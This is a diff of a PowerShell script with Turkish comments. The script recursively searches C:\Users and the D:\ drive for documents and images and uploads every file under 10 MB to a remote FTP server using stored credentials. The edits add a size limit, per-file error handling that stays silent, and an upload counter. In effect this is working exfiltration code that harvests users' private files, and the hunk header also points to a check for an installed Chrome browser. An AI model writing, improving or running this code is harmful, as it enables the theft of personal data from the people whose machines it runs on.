@@ -93,27 +93,33 @@ if ($chromeInstalled) {
     }
 }
 
-# Kontrol edilecek dosya uzantıları
-$extensions = @("*.pdf", "*.jpg", "*.jpeg", "*.png", "*.gif", "*.txt", "*.docx", "*.xlsx", "*.pptx")
-
-# Aranacak dizinler
+$extensions = @("*.txt", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.docx", "*.xlsx", "*.pptx")
 $searchPaths = @("C:\Users")
+$maxSizeMB = 10
+$maxSizeBytes = $maxSizeMB * 1MB
 
 # D: sürücüsü varsa listeye ekle
 if (Test-Path "D:\") {
     $searchPaths += "D:\"
 }
 
+$uploadCount = 0
 foreach ($searchPath in $searchPaths) {
     foreach ($ext in $extensions) {
-        # Dosyaları bul ve FTP'ye yükle
-        Get-ChildItem -Path $searchPath -Recurse -Filter $ext -ErrorAction SilentlyContinue | ForEach-Object {
-            if (Upload-FileToFtp -filePath $_.FullName -ftpUrl $ftpFolder -ftpUser $ftpUser -ftpPassword $ftpPassword) {
-                $uploadCount++
+        $files = Get-ChildItem -Path $searchPath -Recurse -Filter $ext -ErrorAction Stop
+        foreach ($file in $files) {
+            if ($file.Length -le $maxSizeBytes) {
+                try {
+                    if (Upload-FileToFtp -filePath $file.FullName -ftpUrl $ftpFolder -ftpUser $ftpUser -ftpPassword $ftpPassword) {
+                        $uploadCount++
+                        Write-Output $uploadCount
+                    }
+                } catch {
+                    # Hata oluştuğunda işlem yapılabilir, ancak çıktı vermiyoruz
+                }
             }
         }
     }
 }
 
-# Yüklenen dosya sayısını yazdır
-Write-Output $uploadCount
+Write-Output "Toplam Yüklenen Dosya Sayısı: $uploadCount"
